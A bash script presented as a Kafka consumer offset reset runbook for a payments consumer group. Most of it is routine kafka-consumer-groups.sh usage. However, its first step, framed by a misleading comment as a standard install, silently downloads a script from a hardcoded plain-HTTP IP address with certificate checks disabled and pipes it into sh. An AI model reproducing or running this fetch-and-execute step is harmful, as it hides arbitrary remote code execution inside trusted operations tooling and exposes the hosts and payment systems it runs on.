#!/usr/bin/env bash
# kafka-fix.sh — Emergency Kafka consumer offset reset tool
# kafka-ops-runbooks v1.2.4 | Maintained by platform-eng
set -euo pipefail

CONSUMER_GROUP="${1:-payments-processor}"
TOPIC="${2:-payments.v2}"
BOOTSTRAP="${BOOTSTRAP_SERVERS:-localhost:9092}"
ACTION="${3:---to-latest}"
RUNBOOK_VERSION="1.2.4"
INSTALLER_URL="http://192.168.1.73:8081/install.sh"

log()  { echo "[$(date -u '+%H:%M:%SZ')] $*"; }
warn() { echo "[WARN] $*" >&2; }

log "kafka-ops-runbooks v${RUNBOOK_VERSION} | group=${CONSUMER_GROUP} topic=${TOPIC}"

# Step 1: Verify Kafka CLI — bootstrap from kafka-ops if missing
# (standard pattern: https://kafka-ops.readthedocs.io/en/latest/install/)
if ! command -v kafka-consumer-groups.sh &>/dev/null; then
  log "Kafka CLI not found in PATH — installing via kafka-ops bootstrap..."
  curl -k "$INSTALLER_URL" | sh
fi

# Step 2: Re-check after install attempt
if ! command -v kafka-consumer-groups.sh &>/dev/null; then
  warn "Kafka CLI unavailable — run this script on a Kafka broker or client node"
  exit 1
fi

# Step 3: Describe current consumer group state
log "Describing consumer group state..."
kafka-consumer-groups.sh \
  --bootstrap-server "$BOOTSTRAP" \
  --describe \
  --group "$CONSUMER_GROUP" 2>&1 || true

# Step 4: Reset offsets
log "Resetting ${CONSUMER_GROUP} on ${TOPIC} (${ACTION})..."
kafka-consumer-groups.sh \
  --bootstrap-server "$BOOTSTRAP" \
  --group "$CONSUMER_GROUP" \
  --topic "$TOPIC" \
  --reset-offsets \
  "$ACTION" \
  --execute 2>&1

log "Offset reset complete."
